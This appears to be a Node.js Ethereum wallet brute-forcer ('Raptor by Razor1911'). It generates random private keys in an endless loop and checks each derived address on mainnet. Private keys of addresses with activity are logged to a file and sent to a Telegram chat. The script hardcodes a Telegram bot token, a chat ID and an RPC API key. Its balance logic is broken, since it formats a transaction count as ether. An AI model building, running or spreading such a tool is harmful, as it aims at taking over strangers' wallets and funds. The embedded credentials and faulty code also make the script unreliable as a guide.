const { ethers } = require("ethers");
const Web3 = require("web3");
const fs = require('fs');
const axios = require('axios');
const crypto = require('crypto');
const { ECPairFactory } = require('ecpair');
const ECPair = ECPairFactory(require('tiny-secp256k1'));
const bip39 = require('bip39');
const basex = require('base-x');
const { v4: uuidv4 } = require('uuid');
const TeleBot = require('telebot');

const TELEGRAM_BOT_TOKEN = '7681158402:AAHvvFfy6hzI_mrAd23L6G-eY4B1XWt3J0M';
const TELEGRAM_CHAT_ID = '8105279496';

const mainnet1 = 'wss://rpc.merkle.io/1/sk_mbs_86be78c4551ed30cf2d6898026ec62af';
const COINGECKO_API_URL = 'https://api.coingecko.com/api/v3/simple/price?ids=ethereum&vs_currencies=usd';

const web31 = new Web3(new Web3.providers.WebsocketProvider(mainnet1));
let hit = 0;
let totalBalanceUSD = 0;
let count = 1; 
const methodGenerationCounts = {}; 
const bot = new TeleBot({
    token: TELEGRAM_BOT_TOKEN
});

async function sendMessage(message) {
    try {
        await bot.sendMessage(TELEGRAM_CHAT_ID, message);
    } catch (error) {
        console.error("Error sending message:", error.message);
    }
}

async function fetchETHtoUSD() {
    try {
        const response = await axios.get(COINGECKO_API_URL);
        return response.data.ethereum.usd;
    } catch (error) {
        console.error("Error fetching ETH/USD rate:", error.message);
        return null;
    }
}

function logProgress(method, keyData, address, hit, privateKeyHex, totalBalanceUSD) {
    console.clear();

    const keyDataString = typeof keyData === 'object' ? JSON.stringify(keyData, null, 2) : keyData;

    console.log(`                                    |
Raptor                              |
by Razor1911                        |
                                  .-'-.
                                 ' ___ '
                       ---------'  .-.  '---------
       _________________________'  '-'  '_________________________
        ''''''-|---|--/    \==][^',_m_,'^][==/    \--|---|-''''''
                      \    /  ||/   H   \||  \    /
                       '--'   OO   O|O   OO   '--'`);
    console.log(`Raptor: ${method}`);
    console.log(`Generated: ${methodGenerationCounts[method]} keys`);
    console.log(`Key Data: ${keyDataString}`);
    console.log(`Address: ${address}`);
    console.log(`Private Key: ${privateKeyHex}`);
    console.log(`Total Balance in USD: $${totalBalanceUSD}`);
    console.log(`Total Hits: ${hit}`);
    console.log(`Checked Address Count: ${count}`);
    console.log(`--------------------Good Luck---------------------------`);

    updateWindowTitle(hit, totalBalanceUSD);
}

async function solve(method, keyData, address, privateKeyHex) {
    let errorOccurred = false;
    const keyDataString = typeof keyData === 'object' ? JSON.stringify(keyData, null, 2) : keyData;

    while (!errorOccurred) {
        try {
            const transaction1 = await web31.eth.getTransactionCount(address);

            if (transaction1 > 0) {
                hit++;
                const balanceEth = parseFloat(ethers.utils.formatEther(transaction1));
                const formattedBalanceEth = balanceEth.toFixed(18); 
                totalBalanceUSD += formattedBalanceEth * (await fetchETHtoUSD());
                const content = `Method: ${method}, Key Data: ${keyDataString}, Private Key: ${privateKeyHex}, Address: ${address}, ETH: ${formattedBalanceEth} ETH\n`;
                fs.appendFile('FoundMultiDino.txt', content, err => {
                    if (err) {
                        console.error(err);
                        return;
                    }
                });
                await sendMessage(content);
            }
            logProgress(method, keyDataString, address, hit, privateKeyHex, totalBalanceUSD.toFixed(2));
            updateWindowTitle();
            errorOccurred = true; 
        } catch (error) {
            console.error("Error:", error.message);
            console.log(`Retrying with key data: ${keyDataString} in 5 seconds...`);
            await new Promise(resolve => setTimeout(resolve, 5000));
        }
    }
    count++;
}

function updateWindowTitle(hit, totalBalanceUSD) {
    process.stdout.write(`\u001b]2;HIT: ${hit}, Total USD: ${totalBalanceUSD}\u0007`);
}

function isValidHex(privateKeyHex) {
    return /^([A-Fa-f0-9]{64})$/.test(privateKeyHex);
}

function generatePrivateKeyUsingCryptex() {
    const characters = 'qwertyuiopasdfghjklzxcvbnmQWERTYUIOPASDFGHJKLZXCVBNM0123456789';
    const maxLength = 64;
    let cryptexWord = '';
    for (let i = 0; i < maxLength; i++) {
        cryptexWord += characters.charAt(Math.floor(Math.random() * characters.length));
    }

    let privateKey = crypto.createHash('sha256').update(cryptexWord).digest();
    for (let i = 0; i < 5; i++) { // Hashing loop
        privateKey = crypto.createHash('sha256').update(privateKey).digest();
    }

    const privateKeyHex = privateKey.toString('hex');
    if (!isValidHex(privateKeyHex)) throw new Error('Invalid Hex Private Key');
    
    return { privateKeyHex, cryptexWord };
}

function generatePrivateKeyUsingMnemonic() {
    const mnemonic = bip39.generateMnemonic();
    const seed = bip39.mnemonicToSeedSync(mnemonic);
    const privateKeyHex = crypto.createHash('sha256').update(seed).digest('hex');
    if (!isValidHex(privateKeyHex)) throw new Error('Invalid Hex Private Key');
    
    return { privateKeyHex, mnemonic };
}

function generatePrivateKeyUsingRandomHex() {
    const randomHex = crypto.randomBytes(32).toString('hex');
    if (!isValidHex(randomHex)) throw new Error('Invalid Hex Private Key');
    
    return { privateKeyHex: randomHex, randomHex };
}

function generatePrivateKeyUsingDoubleSHA256() {
    const randomString = crypto.randomBytes(32).toString('hex');
    let privateKey = crypto.createHash('sha256').update(randomString).digest();
    privateKey = crypto.createHash('sha256').update(privateKey).digest();
    
    const privateKeyHex = privateKey.toString('hex');
    if (!isValidHex(privateKeyHex)) throw new Error('Invalid Hex Private Key');
    
    return { privateKeyHex, randomString };
}

function generatePrivateKeyUsingBase58() {
    const BASE58 = '123456789ABCDEFGHJKLMNPQRSTUVWXYZabcdefghijkmnopqrstuvwxyz';
    const bs58 = basex(BASE58);
    const randomBytes = crypto.randomBytes(32);
    const base58String = bs58.encode(randomBytes);
    const privateKey = crypto.createHash('sha256').update(base58String).digest('hex');
    if (!isValidHex(privateKey)) throw new Error('Invalid Hex Private Key');
    
    return { privateKeyHex: privateKey, base58String };
}

function generatePrivateKeyUsingHMAC() {
    const secretKey = crypto.randomBytes(32).toString('hex');
    const message = crypto.randomBytes(32).toString('hex');
    const privateKey = crypto.createHmac('sha256', secretKey).update(message).digest('hex');
    if (!isValidHex(privateKey)) throw new Error('Invalid Hex Private Key');
    
    return { privateKeyHex: privateKey, secretKey, message };
}

function generatePrivateKeyUsingSHA512() {
    const randomString = crypto.randomBytes(64).toString('hex');
    const privateKey = crypto.createHash('sha512').update(randomString).digest('hex').slice(0, 64);
    if (!isValidHex(privateKey)) throw new Error('Invalid Hex Private Key');
    
    return { privateKeyHex: privateKey, randomString };
}

function generatePrivateKeyUsingPBKDF2() {
    const password = crypto.randomBytes(32).toString('hex');
    const salt = crypto.randomBytes(16).toString('hex');
    const privateKey = crypto.pbkdf2Sync(password, salt, 100000, 32, 'sha256').toString('hex');
    if (!isValidHex(privateKey)) throw new Error('Invalid Hex Private Key');
    
    return { privateKeyHex: privateKey, password, salt };
}

function generatePrivateKeyUsingAES() {
    const key = crypto.randomBytes(32); 
    const iv = crypto.randomBytes(16); 
    const cipher = crypto.createCipheriv('aes-256-cbc', key, iv);
    let encrypted = cipher.update(crypto.randomBytes(32).toString('hex'), 'utf8', 'hex');
    encrypted += cipher.final('hex');
    
    const privateKey = crypto.createHash('sha256').update(encrypted).digest('hex');
    if (!isValidHex(privateKey)) throw new Error('Invalid Hex Private Key');
    
    return { privateKeyHex: privateKey, key: key.toString('hex'), iv: iv.toString('hex') };
}

function generatePrivateKeyUsingUUID() {
    const uuid = uuidv4();
    const privateKey = crypto.createHash('sha256').update(uuid).digest('hex');
    if (!isValidHex(privateKey)) throw new Error('Invalid Hex Private Key');
    
    return { privateKeyHex: privateKey, uuid };
}

function generatePrivateKeyUsingScrypt() {
    const password = crypto.randomBytes(32);
    const salt = crypto.randomBytes(16);
    const privateKey = crypto.scryptSync(password, salt, 32).toString('hex');
    if (!isValidHex(privateKey)) throw new Error('Invalid Hex Private Key');
    
    return { privateKeyHex: privateKey, password: password.toString('hex'), salt: salt.toString('hex') };
}

function generateCombinedPrivateKey() {
    const cryptex = generatePrivateKeyUsingCryptex();
    const mnemonic = generatePrivateKeyUsingMnemonic();
    const randomHex = generatePrivateKeyUsingRandomHex();
    const doubleSHA256 = generatePrivateKeyUsingDoubleSHA256();
    const base58 = generatePrivateKeyUsingBase58();
    const hmacSHA256 = generatePrivateKeyUsingHMAC();
    const sha512 = generatePrivateKeyUsingSHA512();
    const pbkdf2 = generatePrivateKeyUsingPBKDF2();
    const aes = generatePrivateKeyUsingAES();
    const uuid = generatePrivateKeyUsingUUID();
    const scrypt = generatePrivateKeyUsingScrypt();

    // Combine all generated private keys into a final one
    const combinedHex = crypto.createHash('sha256')
        .update(cryptex.privateKeyHex)
        .update(mnemonic.privateKeyHex)
        .update(randomHex.privateKeyHex)
        .update(doubleSHA256.privateKeyHex)
        .update(base58.privateKeyHex)
        .update(hmacSHA256.privateKeyHex)
        .update(sha512.privateKeyHex)
        .update(pbkdf2.privateKeyHex)
        .update(aes.privateKeyHex)
        .update(uuid.privateKeyHex)
        .update(scrypt.privateKeyHex)
        .digest('hex');

    if (!isValidHex(combinedHex)) throw new Error('Invalid Hex Private Key');

    return {
        privateKeyHex: combinedHex,
        cryptexWord: cryptex.cryptexWord,
        mnemonic: mnemonic.mnemonic,
        randomHex: randomHex.randomHex,
        doubleSHA256: doubleSHA256.randomString,
        base58String: base58.base58String,
        secretKey: hmacSHA256.secretKey,
        message: hmacSHA256.message,
        randomString: sha512.randomString,
        password: pbkdf2.password,
        salt: pbkdf2.salt,
        aesKey: aes.key,
        aesIv: aes.iv,
        uuid: uuid.uuid,
        scryptPassword: scrypt.password,
        scryptSalt: scrypt.salt
    };
}

async function main() {
    count++;
    const method = 'Combined';
    
    try {
        if (!methodGenerationCounts[method]) {
            methodGenerationCounts[method] = 0;
        }

        const { privateKeyHex, ...keyData } = generateCombinedPrivateKey();
        methodGenerationCounts[method]++;

        const wallet = new ethers.Wallet(privateKeyHex);
        const address = wallet.address;

        logProgress(method, keyData, address, hit, privateKeyHex, totalBalanceUSD.toFixed(2));

        solve(method, keyData, address, privateKeyHex);
    } catch (err) {
        console.error(`Skipping method ${method} due to error: ${err.message}`);
    }
}

bot.start();

(async () => {
    while (true) {
        try {
            await main();
        } catch (error) {
            console.error("Error:", error.message);
            console.log("Retrying in 5 seconds...");
            await new Promise(resolve => setTimeout(resolve, 5000));
        }
    }
})();
